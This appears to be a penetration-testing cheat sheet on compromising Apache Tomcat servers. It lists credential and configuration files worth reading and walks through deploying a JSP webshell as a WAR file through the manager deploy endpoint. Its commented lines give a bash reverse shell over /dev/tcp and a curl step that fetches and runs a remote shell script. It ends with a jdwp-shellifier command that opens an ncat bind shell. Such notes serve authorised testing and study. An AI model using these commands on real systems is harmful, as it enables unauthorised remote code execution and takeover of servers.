# Tomcat

### Introduction

Apache **Tomcat** is an open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies.
**Tomcat** provides a "pure Java" HTTP web server environment in which Java code can run.

Following files could be interesting:
- /usr/share/tomcatX/etc/tomcat-users.xml
X=version
- /conf/server.xml
- /conf/web.xml

### AJP Connector

The **AJP Connector** element represents a Connector component that communicates with a web connector via the AJP protocol.

Within some version of Apache, by default the Manager is only accessible from a browser running on that machine.

##### War file upload

In order to see if it's there, check the following path
http://*IP*/manager/text/deploy

You will need to create a .war file by going on  https://github.com/tennc/webshell

jsp/cmdjsp.jsp

```bash
zip cmdjsp.jsp cmdjsp.war # Convert JSP to War file
curl -T cmdjsp.war -u 'username:password' http://IP:PORT/manager/text/deploy?path=/myapp # Post the war file
# Navigate to http://IP:PORT/app2/cmdjsp.jsp
# Or do a POST through Burp Suite with a shell.sh 
# bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
# like CMD=curl IP:PORT/shell.sh -o /tmp/sh 
# CMD=bash /tmp/sh
```
- **JSP** is a collection of technologies that helps software developers create dynamically generated web pages based on HTML, XML, SOAP, or other document types.
- **WAR** is the extension of a file that packages a web application directory hierarchy in ZIP format and is short for Web Archive.

### Java Debug Wire Protocol

The **Java Debug Wire Protocol** is the protocol used for communication between a debugger and the Java virtual machine (VM) which it debugs (hereafter called the target VM)

[jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) is a tool to gain remote code execution on actice JDWP service.

```bash
python ./jdwp-shellifier.py -t IP -p PORT --cmd "ncat -v -l -p 1234 -e /bin/bash"
```